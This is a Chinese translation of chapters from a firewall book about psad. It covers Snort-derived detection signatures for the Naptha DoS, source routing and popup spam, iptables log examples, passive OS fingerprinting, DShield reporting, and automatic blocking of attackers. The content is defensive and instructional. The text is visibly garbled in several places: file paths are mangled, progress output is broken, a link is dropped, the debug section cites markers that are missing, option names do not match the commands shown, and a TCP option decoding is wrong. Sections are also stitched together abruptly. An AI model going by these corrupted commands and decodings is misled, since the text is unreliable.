`Naptha` 拒绝服务工具旨在向目标堆栈发送大量的 `SYN` 数据包，导致系统无法处理合法请求。根据 Snort 规则 ID `275`，`Naptha` 工具创建包含 IP ID `413` 和 TCP 序列号 `606842` 的数据包：

```
 alert tcp $EXTERNAL_NET any <> $HOME_NET any (msg:"DOS NAPTHA"); flags:S; id:413; seq:
606842; reference:bugtraq,2022; reference:cve,2000-1039; reference:url,razor.
bindview.com/publish/advisories/adv_NAPTHA.html; reference:url,www.cert.org/advisories
/CA-2000-21.html; reference:url,www.microsoft.com/technet/security/bulletin/MS00-91
px; classtype:attempted-dos; sid:275; psad_id:100111; psad_dl:2;)
```

以下 `iptables` 日志消息触发 `psad` 中的 Naptha 规则（注意❶ 处的 IP ID 值 `413`、❷ 处的 TCP 序列号 `606842` 以及 ❸ 处的 `SYN` 标志）：

```
 Jul 11 20:28:21 iptablesfw kernel: DROP IN=eth1 OUT= MAC=00:13:46:3a:41:4b:00:a0:cc:
28:42:5a:08:00 SRC=192.168.10.3 DST=192.168.10.1 LEN=60 TOS=0x10 PREC=0x00 TTL=64 ❶ID=
413 DF PROTO=TCP SPT=45664 DPT=15304 ❷SEQ=606842 ACK=0 WINDOW=5840 RES=0x00 ❸SYN
URGP=0Jul 14 15:35:26 iptablesfw psad: src: 192.168.10.3 signature match: "DOS NAPTHA"
(sid: 275) tcp port: 15304
```

### 检测源路由尝试

源路由是 IPv4 协议支持的一种技术，攻击者可以通过该技术尝试通过通常无法访问的网络路由数据包。源路由选项包含在 IP 部的选项部分，Snort 规则 ID `500` 通过 `ipopts` IP 头部测试检测松源路由尝试（加粗显示）：

```
 alert ip $EXTERNAL_NET any -> $HOME_NET any (msg:"MISC source route lssr"; ipopts:
lsrr; reference:arachnids,418; reference:bugtraq,646; reference:cve,1999-0909;
classtype:bad-unknown; sid:500; psad_id:100199; psad_dl:2;);
```





由于只有在使用 IP 选项时才可能发布松散源路由（loose source routing）指令，因此 `psad` 只有在 `iptables` 的 `--log-ip-options` 命令行参数构建了 `LOG` 规则时，才能检测到此类流量。当 `iptables` 记录包含 IP 选项的 IP 数据包时，日志消息会将这些选项作为 `OPT` 字符串的参数，例如 `OPT (830708C0A80A0300)`。根据 RFC 791，松散源路由选项被定义为编号 131（十六进制 83），且长度可变。以下 `iptables` 日志消息包含由包含松散源路由的 IP 数据包生成的 `OPT` 字符串（加粗显示）：

```
 Jul 13 19:39:53 iptablesfw kernel: IN=eth1 OUT= SRC=192.168.10.3 DST=192.168.10.1 LEN=
48 TOS=0x00 PREC=0x00 TTL=64 ID=10096 OPT (830708C0A80A0300) PROTO=TCP SPT=3017 DPT=
0 WINDOW=512 RES=0x00 URGP=0
```

`psad` 注意到了源路由尝试：

```
 Jul 13 19:39:56 iptablesfw psad: src: 192.168.10.3 signature match: "MISC source
route lssr" (sid: 500) ip
```

## 检测 Windows Messenger（Windows Messenger）弹窗垃圾邮件

垃圾邮件是互联网上一个普遍存在的问题，我们都在感受这种灾害的影响。垃圾邮件发送者试图让更多人看到垃圾邮件的一种常见方法是直接通过 Windows Messenger 服务发送。虽然在当这些流量来自外部网络时，检测它们几乎没有用处（因为每条垃圾信息都可以被伪造，且除非消息很大，否则只需要一个 UDP 数据包即可传输），但当它们来自你的内部网络时，检测它们可能至关重要。内网中产生此类流量的任何系统都可能已被入侵，并被远程控制的某人用于发送垃圾邮件。

由于 `psad` 将记录在 `INPUT` 链中的数据包视为指向主网络（无论它们是否来自内部地址），以下签名可以检测指向防火墙的 Windows 弹窗垃圾邮件尝试（注意 ❶ 处在 ❷ 处目的端口范围为 1026 到 1029 的 UDP，以及 ❸ 处使用 `psad_dsize` 测试的应用层数据大小大于 100 字节）。

```
 alert ❶udp $EXTERNAL_NET any -> $HOME_NET ❷1026:1029 (msg:"MISC Windows popup spam
attempt"; classtype:misc-activity; reference:url,www.linklogger.com/UDP1026.htm;
❸ psad_dsize:>100; psad_id:100196; psad_dl:2;)
```

日志消息显示了 `iptables` 如何看到一次弹窗垃圾邮件的尝试（注意目的端口为 1026，且 UDP 数据包的大小——包括 8 字节的 UDP 头部——为 516 字节）：

```
 Jul 14 15:03:24 iptablesfw kernel: DROP IN=eth0 OUT= MAC=00:13:d3:38:b6:e4:00:90:1a:
a0:1c:ec:08:00 SRC=65.182.197.125 DST=71.157.X.X LEN=536 TOS=0x00 PREC=0x00 TTL=
117
ID=6090 PROTO=UDP SPT=3515 DPT=1026 LEN=516
```

`psad` 注意到了该流量并生成了 syslog 警报：

```
 Jul 14 15:03:29 iptablesfw psad: src: 65.182.197.125 signature match: "MISC Windows
popup spam attempt" (sid: 100196) udp port: 1026
```

### 注意事项

尽管之前的示例强调了 `psad` 的 Snort 规则检测能力（重点是测试数据包报头的规则），但运行 `fwsnort` 提供了巨大的改进：`psad` 的检测能力扩展到包含应用层数据，正如你将在 第 11 章 中详细看到的那样。

***

^([44])]) ¹ 在尝试检测当今大多数攻击时，测试应用层的能力非常重要，而 `psad` 在结合 `fwsnort`（其使用 Netfilter 字符串匹配扩展）时提供了这种能力。欲了解更多信息，请参阅 第 11 章。

## psad 签名更新

每个 `psad` 版本通常都包含一个封装在 `psad` tar 压缩包或 RPM 文件中的更新签名集，作为“signatures”文件。然而，签名开发是一个持续的过程，在某些情况下会开发新的签名。为了让人们尽可能快地获得签名，最新的签名发布在 `http://www.lukne.org/psad/signatures`。通过 `sig-update` 命令行参数，`psad` 会下载并放置这些文件，如下输出所示：

```
[+] Archiving original signatures
[+] Downloading latest signatures from:
        http://www.lukne.org/psad/signatures
[+] 100% - 100% [================================]  
[+] 100% - 100% [================001 
[+] 100% - 100% [==================
[+] 100% - 100% [==================
[+] 100% - 100% [======================
[+] 100% - 100% [======================
[+] 100% - 100% [============================
[+] 100% - 100% [============================
[+] 100% - 100% [==============================
[+] 100% - 100% [==============================
[+] 100% - 100% [================================
[+] 100% - 100% [================================
New signature file /etcad/signatures has been put in
You can either restart psad (/init.d/psad) or send the running psad daemon a HUP signal (`psad -H`) so that it will import the new signatures.
```





最知名且成功的被动操作系统指纹实现之一是 `p0f`，它由 Michal Zalewski 开发 ([`lcamtuf.coredump.cx`](http://lcamtuf.coredump.cx))。事实证明，如果你可以被动地拦截原始 TCP 数据包数据——无论是因为你可以访问数据包通过的网络段，还是因为数据包指向或源自你控制的系统——你就可以收集许多对操作系统指纹非常有用的信息。`TCP SYN` 和 `SYN/ACK` 数据包提供的信息最多，因为它们定义了 TCP 连接应当遵循的参数，而且不同的 TCP 栈在协商这些参数时存在某些差异。

在 `p0f` 的操作系统指纹识别中，通过检查来自系统的 `TCP SYN` 或 `SYN/ACK` 数据包中 IP 和 TCP 头部部的几个字段来识别远程操作系统。这些字段包括：

* 分片位 (Fragmentation bit)
* 初始 TTL 值
* 最大段大小 (MSS)
* SYN 数据包总大小
* TCP 选项值和顺序
* TCP 窗口大小

`p0f` 使用自定义签名格式为每个操作系统存储上述特定参数。例如，这里是运行 2.5 内核的 Linux 指纹（该签名需要更新，因为它实际上指的是稳定的 2.6 内核而非 2.5 开发内核，且指纹中也留了对 2.4 内核的支持）：

```
 S3:64:1:60:M*,S,T,N,W1:.:Linux:2.5 (sometimes 2.4) (1)
```

`p0f` 签名格式具有几个由冒号（`:`）字符分隔的字段：

* 从左到右读，第一个字段 `S3` 指 TCP 窗口大小。该字段指示 `p0f` 寻找窗口大小为最大段大小 (MSS) 值三倍倍数的 `TCP SYN` 数据包。
* 第二字段 `64` 指 IP 头部中的 TTL 值；在这种情况下，TTL 为 `64`。由于 `TTL` 值在数据包穿越互联网时会递减，此字段指的是初始 TTL 值，`p0f` 允许数据包中的实际 TTL 值显著小于此。
* 第三个字段 `1` 指 IP 头部中的不分片 (DF) 位。因为签名在该字段中的值为 `1`，所以它在寻找 `DF` 位被设置的情况。
* 第四个字段 `60` 是数据包总大小。在这个示例中，签名要求大小为 `60` 字节。
* 第五个字段 `S,T,N,W1` 描述 TCP 头部的选项部分。在这个示例中，签名正在寻找任何 MSS，随后是选择确认 (`S`)、时间戳 (`T`)、空操作 (`N`) 和窗口缩放因子 (`W1`) 选项。

### 注意
关于被动操作系统指纹（以及其他被动收集的信息）的全面处理可以参考 Michal Zalewski 的 *Silence on the Wire*(No Starch Press, 2005)。

### 使用 psad 模拟 p0f
为了在数据包头部上运行指纹算法，`p0f` 使用 `libpcap` 直接从线路上嗅探数据包。相比之下，`psad` 包含了基于 `p0f` 签名实现操作系统指纹的代码，但它只需要 `iptables` 日志消息作为数据输入。这是因为 `p0f` 检查的每个头部值（TCP 窗口大小、TTL 值、TCP 选项等）只要在构建 `LOG` 规则时使用了 `--log-tcp-options` 参数，就可以在 `iptables` 日志消息中获得。这里有一个 `LOG` 消息示例，其中 TCP 头部的选项部分以粗体显示：

```
 Jul 14 22:03:42 iptablesfw kernel: DROP IN=eth1 OUT= MAC=00:13:46:3a:41:4b: 00:a0:cc:
28:42:5a:08:00 SRC=192.168.10.3 DST=192.168.10.1 LEN=60 TOS=0x10 PREC=0x00 TTL=64 ID=
37356 DF PROTO=TCP SPT=54423 DPT=23 WINDOW=5840 RES=0x00 SYN URGP=0 OPT (020405B
4040
2080A0B00CE790000000001030302)
```

### 从 iptables 日志中解码 TCP 选项
使用上述日志消息实现 `p0f` 操作系统指纹的唯一棘手之处在于，长的 `OPT` 十六进制转储必须经过解码，才能与 `p0f` 签名匹配。`OPT` 字符串代表 TCP 头部选项部分的十六进制转储，通过逐字节一个字节地检查此字符串并将其与 TCP 头部中所有可能的选项值集 ([`www.iana.org/assignments/tcp-parameters`](http://www.iana.org/assignments/tcp-parameters)) 进行匹配，`SYN` 数据包中使用的选项就会变得清晰。除了选项列表结束（End of Option List）和空操作（NOP）选项各占一个字节外，每个选项都由类型指定，后面跟着长度，并以值结束。这被称为*类型-长度-值 (TLV)* 编码。

例如，上述十六进制字符串开头 `020405B4` 解码为 `02` = 最大段大小、`04` = 长度、`05` = 选择确认。





虽然 `psad` 默认未启用 DShield 报告，但 `psad` 安装程序 `install.pl` 会专门询问你是否想要启用它。除非你的安全策略明确禁止将安全事件数据传输到 DShield，否则我强烈建议启用它。

## DShield 报告格式

虽然 DShield 可以接受从 `Snort` 到 `iptables` 等各种软件生成的原始输出，但以特定的格式提交数据有助于减少 DShield 服务器所需的处理工作。该格式要求每个安全事件都单独占一行，并以包含以下字段的制表符分隔列表形式形式存在：

*   `Author`（DShield 用户 ID，如果你没有在 [`www.dshield.org`](http://www.dshield.org) 注册，`psad` 将其默认为零）
*   `Count`（计数）
*   `Date`（格式为 `YYYY-MM-DD HH24:MI:SS Z`，其中 `Z` 为时区）
*   `Protocol`（来自 `/etc/protocols` 的数值项或等效文本，如 `TCP`）
*   `Source IP address`（源 IP 地址）
*   `Source port`（源端口或 ICMP 类型）
*   `Target IP address`（目标 IP 地址）
*   `Target port`（目标端口或 ICMP 代码）
*   `TCP flags`（仅 TCP 告报数据需要）

## DShield 报告示例

如果你已配置 `psad` 将警报数据发送到 DShield，DShield 将向你发送一份汇总所有警报数据的每日报告。以下是我收到的近期 DShield 报告摘要，当时 `psad` 提交了 53 行警报数据。你可以看到左侧是端口号，随后是发送到这些端口的数据包数量、源 IP 地址和目标 IP 地址的数量以及服务名称：

```
 For 2007-07-17 you submitted 53 packets from 23 sources hitting 1 targets.

Port  |  Packets  |  Sources  |  Targets |  Service   |  Name
------+-----------+-----------+----------+------------+-------------
 1434 |         9 |         8 |        1 |   ms-sql-m | Microsoft-SQL-Monitor
  135 |         5 |         4 |        1 |      epmap | DCE endpoint resolution
  139 |         7 |         4 |        1 |netbios-ssn | NETBIOS Session Service
 2100 |         3 |         2 |        1 | amiganetfs | amiganetfs
 1033 |         2 |         2 |        1 |            |
 1521 |         2 |         1 |        1 |     oracle | Oracle 8 SQL (default)
```

## 查看 psad 状态输出

由于 `psad` 在监控 `iptables` 日志时会将各种数据存储在 `/var/log/psad` 目录下，你可以翻阅该目录以了解系统被扫描的程度。

当然，大多数人并不喜欢手动筛选数以千计的 `/var/log/psad/*ip*` 目录及文件，因此 `psad` 通过提供查询本地文件系统以运行中的 `psad` 守护进程状态信息的能力来实现过程自动化。这涉及到在命令行中使用 `--Status` 参数执行 `psad`，如列表 7-1 所示：

```
 [iptablesfw]# psad --Status
❶ [+] psadwatchd (pid: 27812)  %CPU: 0.0  %MEM: 0.0
    Running since: Mon Jul  2 13:58:07 2007

[+] kmsgsd (pid: 27810)  %CPU: 0.0  %MEM: 0.0
    Running since: Mon Jul  2 13:58:07 2007

[+] psad (pid: 27808)  %CPU: 0.0  %MEM: 0.9
    Running since: Mon Jul  2 13:58:07 2007
    Command-line arguments: [none specified]
    Alert email address(es): mbr@cipherdyne.org

[+] Version: psad v2.0.4

❷ [+] Top 50 signature matches:
      "SCAN FIN" (tcp),  Count: 3229,  Unique sources: 1,  Sid: 621
      "MISC VNC communication attempt" (tcp),  Count: 104,  Unique sources: 22,
  Sid: 100202
      "MISC Microsoft SQL Server communication attempt" (tcp),  Count: 81,
  Unique sources: 11,  Sid: 100205
      "MISC Windows popup spam attempt" (udp),  Count: 45,  Unique sources: 42,
  Sid: 100196

❸ [+] Top 25 attackers:
      144.202.X.X DL: 4, Packets: 6571, Sig count: 3311
      32.127.X.X DL: 3, Packets: 188, Sig count: 96
      124.224.X.X DL: 2, Packets: 1, Sig count: 1

❹ [+] Top 20 scanned ports:
      tcp 135   200 packets
      tcp 445   197 packets
      tcp 139   126 packets

      udp 1027  22 packets
      udp 1026  22 packets
      udp 1434  13 packets

❺ [+] iptables log prefix counters:
      "DROP": 4157
      "DROP INVALID": 3251

❻   DShield stats:
      total emails: 5
      total packets: 711

❼    iptables auto-blocked IPs:
        [NONE]
❽ [+] IP Status Detail:

SRC:  144.202.X.X, DL: 4, Dsts: 1, Pkts: 6571, Unique sigs: 1, Email alerts: 11
    Source OS fingerprint(s):
        SunOS:4.1::SunOS 4.1

    DST: 71.157.X.X, Local IP
        Scanned ports: tcp 1-65301, Pkts: 6571, Chain: INPUT, Intf: eth0
        Signature match: "SCAN FIN"
            tcp, Chain: INPUT, Count: 464, DP: 464
```



第 ❼ 行显示了被 `psad` 拦截的 IP 地址。这要求 `ENABLE_AUTO_IDS` 被设置为 `Y`。即使 `ENABLE_AUTO_IDS` 被设置为 `N`，自动响应信息也会始终显示在状态输出中，因为 `psad` 可能在之前的执行中（当时启用了自动响应功能）拦截了一组 IP 地址（即使在当前运行的 `psad` 实例中未启用该功能）。

## IP 地址扫描详情

从 ❽ 处开始列出了 `psad` 当前正在跟踪的所有源 IP 地址，并根据从每个地址监控到的可疑流量，为它们分配了至少 `DANGER_LEVEL1` 严重程度。每个 IP 地址行中还包含了记录可疑数据包的 `iptables` 链和输入接口、来自源 IP 地址的 `TCP`、`UDP` 和 `ICMP` 数据包数量的细分、当前危险等级、邮件告警次数，最后是对生成可疑流量的操作系统系统的推测（参见第 120 页的“使用 p0f 进行被动操作系统指纹识别””）。

### 注意

尽管 `psad` 很好地将扫描信息写入 `/var/log/psad` 目录，但还有另一种方法可以获取有关运行中的 `psad` 守护进程性能的信息。通过执行命令 `psad -U`（使用 root 用户），运行的 `psad` 实例将接收一个 USR1 信号，该信号指示其使用 Perl  `Data::Dumper` 将内部用于跟踪扫描信息的主哈数据结构的内容导出到磁盘。生成的文件为 `/var/log/psad/scan_hash.*pid*`，其中 `pid` 是运行的 `psad` 守护进程的进程 ID。此类输出示例可以从 `http://www.cipherdyne.org/linuxfirewalls` 下载。

## 取证模式 (Forensics Mode)

许多人的系统中留有很多包含 `iptables` 日志数据的旧 syslog 文件。通过在取证模式（forensics mode）下使用 `psad`，可以使用这些旧日志文件告知你过去针对你的系统发生的可疑流量。如果你试图追踪真实的入侵，并想查看在入侵发生前后有哪些 IP 地址可能扫描了你的系统，那么这些信息将变得特别有用。若要在取证模式下运行 `psad`，请使用 `-A` 命令行开关，如列表 7-2 中加粗所示（部分输出已省略）：

```
 [iptablesfw]# psad -A
[+] 进入分析模式。正在解析 /var/log/messages
[+] 在共 10000 行中找到 8804 条 iptables 日志消息。
[+] 已处理 1600 个数据包...
[+] 已处理 8800 个数据包...
[+] 正在分配扫描危险等级...
    Level 1: 3 个 IP 地址
    Level 2: 214 个 IP 地址
    Level 3: 3 个 IP 地址
    Level 4: 2 个 IP 地址
    Level 5: 0 个 IP 地址

    正在跟踪 222 个 IP 地址
```

*列表 7-2：psad 取证输出*

列表 7-2 中的输出包含的信息可以告知你 `psad` 从日志文件中解析的 `iptables` 日志消息总数。输出还列出了五个危险等级中每个等级的 IP 地址总数。取证输出的其余部分（为了简洁在此未显示）与前一节的 `--Status` 输出类似。这包含了关于高频扫描端口、顶级攻击者、签名匹配等更多详细信息。

默认情况下，在取证模式下，`psad` 解析来自日志文件的 `iptables` 日志消息。你可以通过 `-m` 参数更改此路径，如如下所示：

```
 [iptablesfw]# psad -A /some/path
```

### 注意

在第 14 章]中，我们将使用 `psad` 分析并可视化 `iptables` 日志数据（来自 [ynet.org](http://www.honeynet.org) VISUALIZING LOGS)）。

## 详细/调试模式 (Verbose/Debug Mode)

若想在监控 `iptables` 日志消息时查看 `psad` 的内部工作原理，请使用 `--debug` 开关以高度详细模式运行 `psad`：

这会指示 `psad` 不要变成守护进程；它随后可以在 `STDERR` 上显示信息。这包含了从 MAC 地址到操作系统指纹的所有信息。这里是输出示例：

```
 ❶ Jul 11 16:21:31 iptablesfw kernel: DROP IN=eth0 OUT= MAC=00:13:d3:38:b6:e4 SRC=12.17.X DST=71.157.X LEN=64 TOS=00
PREC=00
TTL=43 ID=38577 DF PROTO=TCP SPT=38970 DPT=12754 WINDOW=53760 RES=000
SYN URGP=0 OPT (020405...
```

在上面的 ❶，`psad` 将原始的 iptables 日志消息打印到屏幕上，以便查看 `psad` 分析的数据。在 ❷，“valid packet” 字符串表示 iptables 日志消息是完整的且包含了所有预期字段（在本例中为 TCP）。在 ❸，执行了被动操作系统指纹算法，并在 ❹ `psad` 确定 TCP 数据包匹配了来自 /etc/psad/signatures 文件的 `DDOS mstream client to handler` 签名。在 ❺，由于签名匹配，`psad` 为源 IP 12.17.X 分配了危险等级 2，最后在 ❻ 生成了 psad 邮件告警。

最后，还有两个可以帮助从 `psad` 获取更多信息的命令行开关：`-D` 和 `--fw-dump`。`-D` 指示 `psad` 将其配置以及本地系统 Perl 细节导出到 STDOUT，而 `--fw-dump` 指示 `psad` 显示当前的 iptables 策略。

### 注意

psad 注意不在 `-D` 或 `--fw-dump` 输出中包含敏感信息（包括电子邮件地址、DShield 用户名、IP 地址等），因此你可以自由地将输出发送给他人寻求建议。

## 总结

在本章中，我们涵盖了 `psad` 提供的一些高级功能，用于通过分析 iptables 日志消息来寻找数据包头中的攻击证据，并被动识别远程操作系统向 DShield 报告信息。这些活动都不涉及主动响应攻击或检测可疑的应用层负载。在第 8 章中，我们将看到 `psad` 如何针对攻击者动态实例化拦截规则，在第 9 章中，我们将看到 `iptables` 规则如何模拟具有完全应用层匹配能力的 Snort 规则。





入侵检测系统通常寻求的一种功能是自动响应攻击的能力。针对攻击者的感知 IP 地址，这种网络流量响应可以采取多种形式，包括实例化防火墙拦截规则、修改路由表、针对 UDP 攻击生成 ICMP 端口/主机不可达数据包，以及针对通过 TCP 连接进行的攻击使用 TCP 重置（reset）。在本章中，我们将探索 `psad` 提供的主动响应能力的特性、配置和实现。

# 入侵防御 vs. 主动响应

在当今多样化的计算机安全产品、技术和解决方案中，“入侵防御”（`intrusion prevention`）术受到了广泛关注。这种关注很大程度上源于该术语可能过分强大的含义，但这并不意味着主动预防安全违规的理念没有价值。入侵保护技术涵盖范围很广，从主机级堆栈加固机制（参见位于 [`pax.grsecurity.net`](http://pax.grsecurity.net) 的 PaX 项目）到内联网络设备，其软件可以防止恶意数据包到达其预期目标，同时允许所有其他流量无阻地通过。

相比之下，“主动响应”（`active response`）指的是在检测到攻击后，可以用于对攻击者的一系列机制，这些机制并不一定能阻止攻击。主动响应并不总是能够阻止初始攻击，这是一个重要的区别，它明确地界定了入侵防御与主动响应之间的差异。观察这种区别的最佳方法之一是通过一个启发性的示例。

2004 年的 Witty 蠕虫([`www.lurhq.com/witty.html`](http://www.lurhq.com/witty.html)）利用了 Internet Security Systems（[`www.iss.net`](http://www.iss.net)，现为 IBM 组成）开发的若干产品（包括 BlackICE 和 RealSecure）中 PAM ICQ 模块的漏洞。该蠕虫通过一个源端口为 4000 的任意目的端口的单个 UDP 包在系统与系统之间传输。当易受系统监控到此类数据包时，数据包载荷的内容将被执行，而不仅仅是检查。在 Witty 蠕虫的特定案例中，数据包载荷包含代码，会将 65K 的数据（源自包含漏洞的相同 DLL）写入本地磁盘驱动器的随机点，从而缓慢地导致文件系统损坏。虽然这不会在初始感染时立即破坏系统（例如通过完全格式化磁盘），但它确实会随着推推以微妙的方式破坏系统。

对于任何仍在运行易受版本的 BlackICE 或 RealSecure 的人，首要任务是从 [`www.iss.net/download`](http://www.iss.net/download) 下载并安装补丁。另一个选项是配置本地数据包过滤器，不将源端口为 4000 的 UDP 包转发到内部网络；然而，这将以可能破坏跨防火墙的 ICQ 服务为代价。显然，这不是最优解决方案，因此真正需要的是检测专门与 Witty 蠕虫相关数据包的能力，然后阻止它们进入本地网络。检测需求很容易满足（在最初发现 Witty 蠕虫后，很快编写了 `Snort` 规则），但任何主动响应机制（如发送 `ICMP Port Unreachable` 消息或动态重新配置防火墙规则集）对该蠕虫都是完全无效的。由于整个攻击被封装在单个数据包中，攻击者能够利用以下两个重要事实：

*   向源 IP 地址发送 `ICMP Port Unreachable` 消息是没有意义的，因为攻击已经到达了目标。源 IP 地址不需要关心目标 UDP 服务是否看起来是不可用的。
*   攻击数据包是可以伪造的。从目标的角度来看，攻击可能源自 Yahoo!、一个外部 DNS 服务器或上游路由器。因此，发送任何类型的响应包或实例化防火墙拦截规则可能会干扰基本的网络连接。

真正停止 Witty 蠕虫的唯一方法是使用内联设备，它可以对应该或不应该转发包的内容做出精细的决策。以内联模式运行的 `Snort` 和运行转换后的 `Snort` 规则的 `iptables` 都可以提供这种功能。因为在攻击转发到目标系统之后对单个数据包攻击做出响应是徒用的，这类攻击凸显了主动响应机制与入侵防御机制之间的区别。

# 主动响应的权衡

通过生成破坏会话的流量或修改防火墙策略来对攻击进行自动响应并不是没有副作用。攻击者可能会很快注意到与目标系统的 TCP 会话被关闭，或者与目标的所有连接被切断。最逻辑的结论是部署了某种主动响应机制来保护目标。如果主动响应系统被配置为端口扫描或端口扫描等相对无害的流量做出响应，攻击者将极易滥用这种响应机制并将其转而攻击目标。这也适用于恶意流量，这些流量的交付方式不需要与目标进行双向通信（这使得攻击可以被伪造）。Witty 蠕虫就是此点的完美例子。

## 攻击分类

许多提供主动响应能力的软件（包括 `psad`）提供了对特定主机或网络进行“白名单”（`whitelist`）处理的能力，即使攻击者伪造了来自这些网络的端口扫描或其他恶意流量，响应机制也不会采取任何行动。然而，此类软件的管理员不太会将每个重要系统都包含列表中，因此攻击者的限制仅在于其个人创造力。TCP 空闲扫描（参见 第 3 章）甚至*要求*扫描被伪造才能正常工作。

响应攻击的更好策略是启用响应机制，仅对需要攻击者与目标之间进行双向通信的攻击做出响应。通常，这意味着攻击者已经建立了 TCP 连接并正使用它来投送攻击（例如针对 Web 应用程序的 SQL 注入攻击，或尝试通过监听 TCP 端口的应用程序中的缓冲区溢出漏洞强制目标执行 shell 代码）。

在已建立的 TCP 连接中检测攻击要求检测系统维护一个已建立连接表，并在这些连接中寻找攻击。毕竟，具有看似真实的序列和确认号的 TCP 数据包是可以被伪造的，但此类数据包并不属于任何真正建立的连接，由检测机制来决定。

### 注意

我们将在 第 11 章 中看到，可以使用 Netfilter 的连接跟踪功能来配置 `psad`，使其仅对通过已建立 TCP 会话发送的攻击做出响应。

## 误报

所有入侵检测系统都有产生“误报”（`false positives`）的倾向——即将活动误识别为恶意的警报。“漏报”（`false negatives`），或者说在存在真实恶意流量时未能生成事件，也相当常见。





`psad` 也不例外这一规则，当你运行 `psad` 时，会遇到针对良性流量生成事件的情况。虽然可以通过细致的调整来减少误报，但误报总是有可能发生的；因此，对被误判为恶性的流量进行自动响应不利于维护常规网络连通性。

尽管如此，许多安全管理员认为，某些类型的事件即使是由错误识别的活动引起的，其潜在破坏性也足以让其采取严厉的应对措施。例如，某些蠕虫的爆发对网络及其组成系统可能是灾难性的，因此，只要有被此类蠕虫感染的可能，就可以使用主动响应来尝试缓解爆发。

# 使用 psad 响应攻击

现在我们已经通过对配置为自动响应攻击的系统中存在的权衡进行了讨论，接下来，让我们转向 `psad` 提供的主动响应功能。`psad` 响应攻击的主要方法是动态重新配置本地过滤策略，以便在可配置的时间内阻止来自攻击者源 IP 地址的所有访问。

## 关于 TCPWRAPPERS 的说明

`psad` 还支持重新配置 `/etc/hosts.deny` 文件，以指示 `tcpwrappers` 拒绝来自攻击者源 IP 地址的访问，但由于几个原因，这种机制劣于使用 `iptables`。首先，`tcpwrappers` 只能阻塞配置为使用 `tcpwrappers` 的守护进程；相比之下，`iptables` 中的通用阻塞规则意味着攻击者无法通过目标系统的 IP 栈进行通信。其次，`tcpwrappers` 只对运行在本地系统上的守护进程有效，而 `psad` 可能会在 `FORWARD` 链中检测扫描或其他恶意流量。最后，当守护进程被 `tcpwrappers` 保护时，攻击者能够与目标系统的更多功能进行交互；而 `iptables` 可交互的功能较少，且这些任何一个功能（无论是内核内还是用户态内）都有非零概率包含安全漏洞。本章的剩余部分将集中在 `psad` 中使用 `iptables` 进行主动响应。

动态重新配置本地 `iptables` 策略的能力意味着响应发生在网络层；例如，攻击者的 IP 地址被阻止通过 IP 栈向上通信。如果当阻塞规则实例化时，攻击者与本地网络中的任何服务器建立了 TCP 会话，那么（因为没有随阻塞规则生成 TCP 重置），所有 TCP 数据包将被丢弃，端点 TCP 栈将尝试重传数据直到超时。

## 功能

`psad` 支持以下主动响应功能：

*   攻击者在添加 `iptables` 阻塞规则之前必须达到的最小危险等级
*   根据可配置的超时时间将阻塞规则设置为永久或临时的能力
*   对所有阻塞规则使用独立的 `iptables` 链，以免干扰本地系统上任何现有的 `iptables` 策略
*   在 `psad` 重启甚至系统重启时保留阻塞规则（此功能是配置的，但默认设置在 `psad` 启动时清空所有现有的阻塞规则）
* 包含所有当前封锁 IP 地址的状态输出，以及相关 `iptables` 规则被删除前的剩余秒数
* 能够通过使用 `--fw-block-ip` 和 `--fw-rm-block-ip` 命令行参数，让外部进程指示 `psad` 为特定 IP 地址添加或删除阻塞规则的能力
* 区分端口扫描和触发签名匹配的攻击的能力，并在 `iptables` 中添加可以绑定到其中任一者的阻塞规则
*   当 IP 地址从 `psad` 阻塞链中添加或删除时发送电子邮件通知

## 配置变量

控制 `psad` 是否进入主动响应模式的最重要变量是 `ENABLE_AUTO_IDS`，可以在 `/etc/psad/psad.conf` 文件中设置为 `Y` 或 `N`。当启用此功能时，其他几个变量（下文讨论）将控制 `psad` 在尝试自动阻止攻击者时的各种操作方面。

`AUTO_IDS_DANGER_LEVEL` 变量设置了一个 1 到 5 的阈值，作为 IP 地址在实例化阻塞规则之前必须的最小危险等级。通过调整端口扫描阈值、单个签名危险等级（见 `/etc/psad/signatures`）和自动危险等级分配（见 `/etc/psad/auto_dl`），可以让 `psad` 对是否自动阻止 IP 地址做出细粒度的决策。例如，如果某个特定的 IP 地址或网络（例如 `192.168.1.0/24`）由于历史上的扫描或入侵尝试是已知的坏活动者，那么你可能想通过向 `/etc/psad/auto_dl` 文件中添加以下行来严格限制来自此地址的通信：

```
192.168.1.0/24        5;
```

那么，如果 `192.168.1.0/24` 类 C 网络中的任何 IP 地址违反了过滤策略，将对该 IP 地址添加阻塞规则，无论 `AUTO_IDS_DANGER_LEVEL` 设置多高。

在正常情况下，`iptables` 配置为不记录指向关键服务（如 Web 会话或 DNS 流量）的合法流量，因此 `192.168.1.0/24` 网络中的任何 IP 地址只要不导致 `iptables` 记录数据包，就可以不受中断地访问此类服务。

### 注意

*合法的*流量是一个模糊的概念，在第 9 章和第 10 章中，我们将看到*合法的*并不意味着建立了一个语法上有效的传输层连接；`iptables` 还可以检查应用层数据是否存在攻击。

`AUTO_BLOCK_TIMEOUT` 变量定义了 `iptables` 阻塞规则生效的持续时间（秒）。默认值为 3600，即一小时。通过将 `AUTO_BLOCK_TIMEOUT` 设置为零，所有阻塞规则将变为永久，并且只有在 `psad` 重启或系统重启时才会被删除，除非 `FLUSH_IPT_AT_INIT` 被禁用。

`IPTABLES_BLOCK_METHOD` 和 `TCPWRAPPERS_BLOCK_METHOD` 变量控制 `psad` 使用 `iptables` 还是 `tcpwrappers` 来阻止违规 IP 地址。如果 `psad` 配置为响应攻击，推荐的设置是启用 `iptables` 阻塞。

`ENABLE_AUTO_IDS_REGEX` 和 `AUTO_BLOCK_REGEX` 变量允许将添加地址阻塞规则的行为与日志前缀是否匹配特定正则表达式绑定。这对于阻止 IP 地址最有用，但仅在监控需要通过已建立 TCP 会话进行双向通信的攻击之后。由于端口扫描很容易被伪造，此功能提供了一种强大的机制，将阻塞规则限制为并非攻击者简单伪造的 IP 地址。

最后，自动阻止攻击者的其余重要配置变量控制 `iptables` 规则的创建方式。这些变量都以 `IPT_AUTO_CHAIN` 字符串开头，后跟一个整数（就像 `DANGER_LEVEL{n}` 变量一样），它们指定了影响 `psad` 向 `iptables` 添加规则的七个标准：

*   规则的 `iptables` 目标（例如 `DROP`）
*   是否将规则应用于源或目的（或两者都是）





*   添加规则的表（例如，`filter` 表）
*   为自定义 `psad` 链添加跳转规则（jump rule）的 `iptables` 链
*   在该 `iptables` 链中添加跳转规则的位置
*   自定义 `psad` 链的名称
*   在自定义 `psad` 链中添加新规则的位置

